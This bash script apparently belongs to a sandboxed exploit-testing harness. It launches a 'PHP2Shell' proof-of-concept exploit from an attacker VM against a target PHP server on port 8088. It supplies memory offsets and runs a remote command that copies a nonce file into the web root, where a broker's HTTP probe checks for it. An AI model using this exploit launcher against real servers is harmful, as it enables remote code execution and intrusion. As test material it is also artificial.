#!/usr/bin/env bash
# Run the PHP2Shell PoC from the attacker VM. Runs as xentry-guest.
# The broker's HTTP probe, not this transcript, is decisive.
# Args: target_ip nonce_path poc_dir zif_offset dtor_offset
set -euo pipefail
target_ip="${1:?target_ip}"
nonce_path="${2:?nonce_path}"
poc_dir="${3:?poc_dir}"
zif_offset="${4:-0x466220}"
dtor_offset="${5:-0x645870}"
case "$nonce_path" in
  /*) ;;
  *) echo "nonce_path must be absolute" >&2; exit 2 ;;
esac
case "$nonce_path" in
  *[[:space:]]*) echo "nonce_path must not contain whitespace" >&2; exit 2 ;;
esac
cd "$poc_dir"
python3 exploit.py \
  --host "$target_ip" \
  --port 8088 \
  --cmd "cat $nonce_path > /var/www/html/xentry-leak.txt" \
  --zif-offset "$zif_offset" \
  --dtor-offset "$dtor_offset" \
  --sleep-oracle \
  --timeout 30
